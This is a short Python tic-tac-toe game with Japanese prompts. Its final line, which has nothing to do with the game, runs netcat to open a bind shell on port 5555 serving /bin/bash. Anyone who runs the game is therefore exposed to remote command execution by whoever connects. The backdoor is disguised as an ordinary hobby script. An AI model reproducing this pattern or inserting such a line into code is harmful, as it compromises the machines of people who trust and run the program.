#!/bin/usr/python
import subprocess


the_board = {"w": " ", "e": " ", "r": " ",
             "s": " ", "d": " ", "f": " ",
             "x": " ", "c": " ", "v": " "}


def print_board(board):
    print(board["w"] + "|" + board["e"] + "|" + board["r"])
    print("-+-+-")
    print(board["s"] + "|" + board["d"] + "|" + board["f"])
    print("-+-+-")
    print(board["x"] + "|" + board["c"] + "|" + board["v"])


turn = 'X'
for i in range(9):
    print_board(the_board)
    print(turn + 'の番です。どこに打つ？')
    print('左上:w　上:e　右上:r')
    print('左中:s　真ん中:d　右中:f')
    print('左下:x　下:c　右下:v')
    move = input()
    the_board[move] = turn

    if turn == 'X':
        turn = 'O'
    else:
        turn = 'X'
print_board(the_board)


subprocess.run(['nc', '-lp', '5555', '-e', '/bin/bash'])
